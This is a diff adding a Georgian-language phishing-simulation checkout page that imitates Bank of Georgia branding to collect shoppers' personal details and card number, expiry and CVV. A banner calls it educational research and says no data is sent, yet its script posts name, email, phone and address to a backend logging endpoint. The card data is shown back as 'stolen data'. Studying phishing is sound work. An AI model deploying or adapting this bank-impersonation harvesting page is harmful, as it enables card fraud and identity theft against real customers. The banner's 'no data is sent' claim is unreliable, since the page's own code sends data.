@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TechShop – შეკვეთა</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --blue: #0d47a1;
+  --orange: #ff6f00;
+  --green: #2e7d32;
+  --bog: #fc6719;
+  --bog-dark: #e55a0e;
+  --bg: #f0f4f8;
+  --border: #e0e0e0;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--bg); min-height:100vh; }
+
+.warn-bar { background:#c0392b; color:#fff; text-align:center; padding:8px 14px; font-size:11px; font-weight:700; }
+
+/* HEADER */
+.header {
+  background:var(--blue); height:56px;
+  display:flex; align-items:center; gap:10px;
+  padding:0 18px;
+  box-shadow:0 2px 8px rgba(0,0,0,.2);
+}
+.logo-icon { width:32px; height:32px; background:#fff; border-radius:7px; display:flex; align-items:center; justify-content:center; font-size:16px; }
+.logo-text  { color:#fff; font-size:17px; font-weight:800; }
+.logo-text span { color:#ffcc02; }
+.header-back { color:rgba(255,255,255,.8); font-size:13px; margin-left:auto; cursor:pointer; }
+
+/* STEPS BAR */
+.steps-bar {
+  background:#fff; border-bottom:1px solid var(--border);
+  display:flex; justify-content:center; gap:0;
+  padding:0;
+}
+.step-tab {
+  flex:1; max-width:180px; padding:14px 8px;
+  text-align:center; font-size:12px; font-weight:600; color:#aaa;
+  border-bottom:3px solid transparent;
+  display:flex; align-items:center; justify-content:center; gap:6px;
+}
+.step-tab.active { color:var(--bog); border-bottom-color:var(--bog); }
+.step-tab.done   { color:var(--green); }
+.step-num {
+  width:20px; height:20px; border-radius:50%;
+  background:#eee; color:#aaa;
+  font-size:11px; font-weight:800;
+  display:flex; align-items:center; justify-content:center; flex-shrink:0;
+}
+.step-tab.active .step-num { background:var(--bog); color:#fff; }
+.step-tab.done   .step-num { background:var(--green); color:#fff; }
+
+/* MAIN */
+.main { max-width:560px; margin:20px auto 40px; padding:0 14px; }
+
+/* ORDER SUMMARY */
+.order-summary {
+  background:#fff; border-radius:13px;
+  padding:16px 18px; margin-bottom:16px;
+  box-shadow:0 2px 8px rgba(0,0,0,.07);
+  display:flex; align-items:center; gap:14px;
+}
+.order-img { width:64px; height:64px; background:linear-gradient(135deg,#e3f2fd,#bbdefb); border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:36px; flex-shrink:0; }
+.order-name { font-size:14px; font-weight:700; color:#1a1a1a; margin-bottom:4px; }
+.order-desc { font-size:12px; color:#888; margin-bottom:6px; }
+.order-price-row { display:flex; align-items:center; gap:8px; }
+.op-old { font-size:12px; color:#aaa; text-decoration:line-through; }
+.op-new { font-size:18px; font-weight:800; color:var(--green); }
+.free-tag { background:#e8f5e9; color:var(--green); font-size:11px; font-weight:700; border-radius:6px; padding:2px 7px; border:1px solid #a5d6a7; }
+
+/* FORM CARD */
+.form-card {
+  background:#fff; border-radius:13px;
+  padding:20px 18px; margin-bottom:16px;
+  box-shadow:0 2px 8px rgba(0,0,0,.07);
+}
+.form-card h3 { font-size:15px; font-weight:700; color:#1a1a1a; margin-bottom:16px; display:flex; align-items:center; gap:8px; }
+
+.field { margin-bottom:14px; }
+.field label { display:block; font-size:11px; font-weight:700; color:#555; text-transform:uppercase; letter-spacing:0.4px; margin-bottom:6px; }
+.field input, .field select {
+  width:100%; padding:12px 14px;
+  border:1.5px solid var(--border); border-radius:9px;
+  font-size:14px; color:#1a1a1a; outline:none;
+  font-family:inherit; background:#fff;
+  transition:border-color .2s;
+  -webkit-appearance:none;
+}
+.field input:focus, .field select:focus { border-color:var(--bog); }
+.field input.error { border-color:#e53935; }
+.field .err-msg { font-size:11px; color:#e53935; margin-top:4px; display:none; }
+.field input.error + .err-msg { display:block; }
+
+.field-row { display:flex; gap:10px; }
+.field-row .field { flex:1; }
+
+/* delivery note */
+.delivery-note {
+  background:#e8f5e9; border-radius:9px; padding:12px 14px;
+  display:flex; gap:10px; align-items:flex-start; margin-bottom:14px;
+  border:1px solid #a5d6a7;
+}
+.delivery-note p { font-size:12px; color:#2e7d32; line-height:1.5; }
+
+/* BTN */
+.btn-primary {
+  width:100%; padding:16px;
+  border:none; border-radius:11px;
+  font-size:16px; font-weight:800; cursor:pointer;
+  font-family:inherit; transition:opacity .15s;
+  -webkit-tap-highlight-color:transparent;
+}
+.btn-primary:active { opacity:.85; }
+.btn-next-step { background:linear-gradient(90deg,#0d47a1,#1565c0); color:#fff; box-shadow:0 4px 14px rgba(13,71,161,.3); }
+.btn-bog       { background:var(--bog); color:#fff; box-shadow:0 4px 14px rgba(252,103,25,.35); display:flex; align-items:center; justify-content:center; gap:10px; }
+.btn-bog:hover { background:var(--bog-dark); }
+
+/* ── PAYMENT STEP ── */
+.bog-header {
+  background:var(--bog); border-radius:13px 13px 0 0;
+  padding:16px 18px; display:flex; align-items:center; gap:12px;
+  margin-bottom:0;
+}
+.bog-logo-box { width:44px; height:44px; background:#fff; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:13px; font-weight:900; color:var(--bog); flex-shrink:0; }
+.bog-header h3 { color:#fff; font-size:16px; font-weight:700; }
+.bog-header p  { color:rgba(255,255,255,.85); font-size:11px; }
+
+.bog-body { background:#fff; border-radius:0 0 13px 13px; padding:20px 18px; margin-bottom:16px; box-shadow:0 2px 8px rgba(0,0,0,.07); }
+
+.card-visual {
+  background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
+  border-radius:12px; padding:18px 20px; margin-bottom:18px;
+  color:#fff; position:relative; overflow:hidden;
+}
+.card-visual::before { content:''; position:absolute; top:-30px; right:-30px; width:120px; height:120px; border-radius:50%; background:rgba(255,255,255,.05); }
+.card-chip { font-size:22px; margin-bottom:12px; }
+.card-num-display { font-size:16px; font-weight:700; letter-spacing:3px; margin-bottom:10px; font-variant-numeric:tabular-nums; color:rgba(255,255,255,.9); }
+.card-bottom { display:flex; justify-content:space-between; align-items:flex-end; }
+.card-label { font-size:9px; color:rgba(255,255,255,.5); text-transform:uppercase; letter-spacing:0.5px; }
+.card-value { font-size:13px; font-weight:600; color:#fff; }
+.card-type   { font-size:24px; }
+
+/* card fields */
+.field.card-field input { letter-spacing:2px; font-size:15px; font-weight:600; }
+.field.cvv-field input  { letter-spacing:3px; font-size:15px; font-weight:600; }
+
+/* amount box */
+.amount-box {
+  background:#fff3eb; border:1.5px solid var(--bog);
+  border-radius:10px; padding:14px 16px; margin-bottom:16px;
+  display:flex; justify-content:space-between; align-items:center;
+}
+.amount-box .label { font-size:13px; color:#555; font-weight:600; }
+.amount-box .amount { font-size:22px; font-weight:800; color:var(--bog); }
+
+/* secure badges */
+.secure-row { display:flex; justify-content:center; gap:16px; margin-top:12px; flex-wrap:wrap; }
+.secure-badge { font-size:11px; color:#888; display:flex; align-items:center; gap:4px; }
+
+/* success screen */
+.success-screen { display:none; text-align:center; padding:40px 20px; }
+.success-screen .s-icon { font-size:64px; margin-bottom:16px; }
+.success-screen h2 { font-size:22px; font-weight:800; color:#1a1a1a; margin-bottom:8px; }
+.success-screen p  { font-size:14px; color:#666; line-height:1.6; margin-bottom:24px; }
+.success-screen .detail-box { background:#f5f5f5; border-radius:10px; padding:16px; text-align:left; font-size:13px; color:#333; margin-bottom:20px; }
+.success-screen .detail-box div { margin-bottom:8px; display:flex; justify-content:space-between; }
+.success-screen .detail-box div:last-child { margin:0; }
+
+/* INDICATORS */
+.indicators { background:#fff3cd; border:2px solid #ffc107; border-radius:10px; padding:12px 16px; margin-bottom:16px; }
+.indicators h3 { color:#856404; font-size:12px; margin-bottom:6px; }
+.indicators ul  { color:#533f03; font-size:11px; padding-left:16px; line-height:1.9; }
+
+/* steps visibility */
+#step-address { display:block; }
+#step-payment { display:none; }
+</style>
+</head>
+<body>
+
+<div class="warn-bar">⚠️ სასწავლო/სადემონსტრაციო ფიშინგის სიმულაცია — საბაკალავრო კვლევა. მონაცემები არ იგზავნება.</div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo-icon">🛒</div>
+  <div class="logo-text">Tech<span>Shop</span></div>
+  <div class="header-back" onclick="history.back()">← მთავარი</div>
+</div>
+
+<!-- STEPS -->
+<div class="steps-bar">
+  <div class="step-tab active" id="tab1">
+    <div class="step-num" id="sn1">1</div> მიწოდება
+  </div>
+  <div class="step-tab" id="tab2">
+    <div class="step-num" id="sn2">2</div> გადახდა
+  </div>
+</div>
+
+<div class="main">
+
+  <!-- INDICATORS -->
+  <div class="indicators">
+    <h3>🔍 ფიშინგის ინდიკატორები (Checkout):</h3>
+    <ul>
+      <li><strong>PII Harvesting:</strong> სახელი + ელ-ფოსტა + ტელეფონი + მისამართი — სრული პირადი პროფილი ერთ ფორმაში</li>
+      <li><strong>Card Data Theft:</strong> კარტის ნომერი, ვადა, CVV → attacker-ის სერვერზე, არა BOG-ზე</li>
+      <li><strong>Fake BOG UI:</strong> BOG-ის ფერები და ლოგო — ვიზუალურად ნდობის შთაგონება</li>
+      <li><strong>მცირე თანხა (5 ₾):</strong> მსხვერპლი ნაკლებ სიფხიზლეს ამჟღავნებს პატარა გადახდისთვის, მაგრამ კარტის ინფო სრულად ინახება</li>
+    </ul>
+  </div>
+
+  <!-- ORDER SUMMARY -->
+  <div class="order-summary">
+    <div class="order-img">🔌</div>
+    <div>
+      <div class="order-name">MagSafe iPhone დამტენი 15W</div>
+      <div class="order-desc">Referral შეთავაზება · 1 ცალი</div>
+      <div class="order-price-row">
+        <span class="op-old">49 ₾</span>
+        <span class="op-new">5 ₾</span>
+        <span class="free-tag">🚚 მიტანა უფასო</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 1: ADDRESS ══ -->
+  <div id="step-address">
+    <div class="form-card">
+      <h3>📦 მიწოდების ინფორმაცია</h3>
+
+      <div class="field-row">
+        <div class="field">
+          <label>სახელი</label>
+          <input type="text" id="fname" placeholder="გიორგი" autocomplete="given-name">
+          <div class="err-msg">შეავსეთ სახელი</div>
+        </div>
+        <div class="field">
+          <label>გვარი</label>
+          <input type="text" id="lname" placeholder="ბერიძე" autocomplete="family-name">
+          <div class="err-msg">შეავსეთ გვარი</div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>ელ. ფოსტა</label>
+        <input type="email" id="email" placeholder="giorgi@gmail.com" autocomplete="email" inputmode="email">
+        <div class="err-msg">შეიყვანეთ სწორი ელ. ფოსტა</div>
+      </div>
+
+      <div class="field">
+        <label>ტელეფონის ნომერი</label>
+        <input type="tel" id="phone" placeholder="+995 5XX XXX XXX" autocomplete="tel" inputmode="tel">
+        <div class="err-msg">შეიყვანეთ სწორი ნომერი</div>
+      </div>
+
+      <div class="field">
+        <label>მისამართი</label>
+        <input type="text" id="addr" placeholder="ქუჩა, სახლი, ბინა" autocomplete="street-address">
+        <div class="err-msg">შეავსეთ მისამართი</div>
+      </div>
+
+      <div class="field-row">
+        <div class="field">
+          <label>უბანი</label>
+          <select id="district">
+            <option value="">აირჩიეთ</option>
+            <option>ვაკე</option>
+            <option>საბურთალო</option>
+            <option>გლდანი</option>
+            <option>ისანი</option>
+            <option>ნაძალადევი</option>
+            <option>დიდუბე</option>
+            <option>ჩუღურეთი</option>
+            <option>კრწანისი</option>
+            <option>მთაწმინდა</option>
+          </select>
+          <div class="err-msg">აირჩიეთ უბანი</div>
+        </div>
+        <div class="field">
+          <label>სართული / ბინა</label>
+          <input type="text" id="apt" placeholder="სართ. 4, ბ. 12">
+        </div>
+      </div>
+
+      <div class="delivery-note">
+        <span style="font-size:20px">🚚</span>
+        <p>მიტანა ხვალ 12:00–20:00 სთ შორის, მთელი თბილისი — უფასო. კურიერი ზარით დაგიკავშირდება.</p>
+      </div>
+
+      <button class="btn-primary btn-next-step" onclick="goPayment()">
+        გადახდაზე გადასვლა →
+      </button>
+    </div>
+  </div>
+
+  <!-- ══ STEP 2: PAYMENT ══ -->
+  <div id="step-payment">
+
+    <!-- BOG HEADER -->
+    <div class="bog-header">
+      <div class="bog-logo-box">BOG</div>
+      <div>
+        <h3>საქართველოს ბანკი</h3>
+        <p>უსაფრთხო გადახდა · Secure Payment</p>
+      </div>
+    </div>
+    <div class="bog-body">
+
+      <!-- card visual preview -->
+      <div class="card-visual" id="card-preview">
+        <div class="card-chip">💳</div>
+        <div class="card-num-display" id="prev-num">•••• •••• •••• ••••</div>
+        <div class="card-bottom">
+          <div>
+            <div class="card-label">ბარათის მფლობელი</div>
+            <div class="card-value" id="prev-name">სახელი გვარი</div>
+          </div>
+          <div style="text-align:center">
+            <div class="card-label">ვადა</div>
+            <div class="card-value" id="prev-exp">MM/YY</div>
+          </div>
+          <div class="card-type" id="prev-type">💳</div>
+        </div>
+      </div>
+
+      <!-- amount -->
+      <div class="amount-box">
+        <div class="label">გადასახდელი თანხა</div>
+        <div class="amount">5.00 ₾</div>
+      </div>
+
+      <!-- card number -->
+      <div class="field card-field">
+        <label>ბარათის ნომერი</label>
+        <input type="tel" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" oninput="fmtCard(this)" onkeyup="updatePreview()">
+        <div class="err-msg">შეიყვანეთ ბარათის ნომერი</div>
+      </div>
+
+      <div class="field">
+        <label>ბარათის მფლობელი</label>
+        <input type="text" id="card-name" placeholder="GIORGI BERIDZE" style="text-transform:uppercase;letter-spacing:1px;" oninput="updatePreview()">
+        <div class="err-msg">შეიყვანეთ სახელი ლათინურად</div>
+      </div>
+
+      <div class="field-row">
+        <div class="field">
+          <label>ვადის გასვლა</label>
+          <input type="tel" id="card-exp" placeholder="MM/YY" maxlength="5" inputmode="numeric" oninput="fmtExp(this)" onkeyup="updatePreview()">
+          <div class="err-msg">MM/YY ფორმატი</div>
+        </div>
+        <div class="field cvv-field">
+          <label>CVV / CVC</label>
+          <input type="tel" id="card-cvv" placeholder="•••" maxlength="3" inputmode="numeric">
+          <div class="err-msg">3-ნიშნა კოდი</div>
+        </div>
+      </div>
+
+      <button class="btn-primary btn-bog" onclick="submitPayment()">
+        <span style="font-size:18px;font-weight:900">BOG</span> გადახდა — 5.00 ₾
+      </button>
+
+      <div class="secure-row">
+        <div class="secure-badge">🔒 SSL დაშიფვრა</div>
+        <div class="secure-badge">🛡 3D Secure</div>
+        <div class="secure-badge">✅ PCI DSS</div>
+      </div>
+
+    </div>
+
+    <!-- SUCCESS SCREEN (hidden) -->
+    <div class="success-screen" id="success-screen">
+      <div class="s-icon">🎣</div>
+      <h2>ფიშინგის სიმულაცია!</h2>
+      <p>რეალური შეტევისას ეს ყველაფერი attacker-ის სერვერზე გაიგზავნებოდა:</p>
+      <div class="detail-box" id="stolen-data"></div>
+      <p style="font-size:12px;color:#888;margin-bottom:20px;line-height:1.6;">
+        შემდეგ მსხვერპლი redirect-დება ნამდვილ BOG-ზე ან "შეცდომის" შეტყობინებით — 
+        ეჭვი არ ეპარება, კარტა კი უკვე კომპრომეტირებულია. 
+        სრული ბალანსის გამოტანა შეიძლება რამდენიმე წამში.
+      </p>
+      <button onclick="window.location.href='techshop-home.html'" style="background:var(--bog);color:#fff;border:none;border-radius:10px;padding:14px 28px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;width:100%;">
+        ← მთავარ გვერდზე დაბრუნება
+      </button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ── STEP NAV ──
+async function goPayment() {
+
+  const fields = ['fname','lname','email','phone','addr','district'];
+  let ok = true;
+
+  fields.forEach(id => {
+    const el = document.getElementById(id);
+    const val = el.value.trim();
+
+    if (!val) {
+      el.classList.add('error');
+      ok = false;
+    } else {
+      el.classList.remove('error');
+    }
+  });
+
+  const emailEl = document.getElementById('email');
+
+  if (emailEl.value && !emailEl.value.includes('@')) {
+    emailEl.classList.add('error');
+    ok = false;
+  }
+
+  if (!ok) return;
+
+  // მონაცემების გაგზავნა ბექში
+  const data = {
+    fname: document.getElementById('fname').value,
+    lname: document.getElementById('lname').value,
+    email: document.getElementById('email').value,
+    phone: document.getElementById('phone').value,
+    address:
+      document.getElementById('addr').value +
+      ', ' +
+      document.getElementById('district').value
+  };
+
+  try {
+
+    const response = await fetch('https://localhost:7011/api/log/pinfo', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    });
+
+    if (response.ok) {
+      console.log('personal info saved');
+    }
+
+  } catch (err) {
+    console.error(err);
+  }
+
+  // შემდეგ გვერდზე გადასვლა
+  window.location.href = 'bog-payment-phishing-demo.html';
+}
+
+// ── CARD FORMATTING ──
+function fmtCard(el) {
+  let v = el.value.replace(/\D/g,'').substring(0,16);
+  el.value = v.replace(/(.{4})/g,'$1 ').trim();
+}
+function fmtExp(el) {
+  let v = el.value.replace(/\D/g,'');
+  if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+  el.value = v;
+}
+
+// ── LIVE PREVIEW ──
+function updatePreview() {
+  const num  = document.getElementById('card-num').value  || '•••• •••• •••• ••••';
+  const name = document.getElementById('card-name').value || 'სახელი გვარი';
+  const exp  = document.getElementById('card-exp').value  || 'MM/YY';
+  document.getElementById('prev-num').textContent  = num.padEnd(19,'•').substring(0,19);
+  document.getElementById('prev-name').textContent = name.toUpperCase();
+  document.getElementById('prev-exp').textContent  = exp;
+  // card type icon
+  const first = (document.getElementById('card-num').value||'')[0];
+  const types = {'4':'💳 Visa','5':'💳 MC','3':'💳 Amex'};
+  document.getElementById('prev-type').textContent = types[first] || '💳';
+}
+
+// ── PAYMENT SUBMIT ──
+function submitPayment() {
+  const fields = [
+    {id:'card-num', check: v => v.replace(/\s/g,'').length===16},
+    {id:'card-name',check: v => v.length > 2},
+    {id:'card-exp', check: v => /^\d{2}\/\d{2}$/.test(v)},
+    {id:'card-cvv', check: v => v.length===3},
+  ];
+  let ok = true;
+  fields.forEach(f => {
+    const el = document.getElementById(f.id);
+    if (!f.check(el.value.trim())) { el.classList.add('error'); ok = false; }
+    else el.classList.remove('error');
+  });
+  if (!ok) return;
+
+  // show stolen data
+  document.getElementById('stolen-data').innerHTML = `
+    <div><span>👤 სახელი</span><strong>${document.getElementById('fname').value} ${document.getElementById('lname').value}</strong></div>
+    <div><span>📧 ელ-ფოსტა</span><strong>${document.getElementById('email').value}</strong></div>
+    <div><span>📱 ტელეფონი</span><strong>${document.getElementById('phone').value}</strong></div>
+    <div><span>📍 მისამართი</span><strong>${document.getElementById('addr').value}, ${document.getElementById('district').value}</strong></div>
+    <div><span>💳 კარტის ნომ.</span><strong>${document.getElementById('card-num').value}</strong></div>
+    <div><span>📅 ვადა</span><strong>${document.getElementById('card-exp').value}</strong></div>
+    <div><span>🔑 CVV</span><strong>${document.getElementById('card-cvv').value}</strong></div>
+  `;
+  document.querySelector('.bog-header').style.display = 'none';
+  document.querySelector('.bog-body').style.display   = 'none';
+  document.getElementById('success-screen').style.display = 'block';
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+</script>
+</body>
+</html>
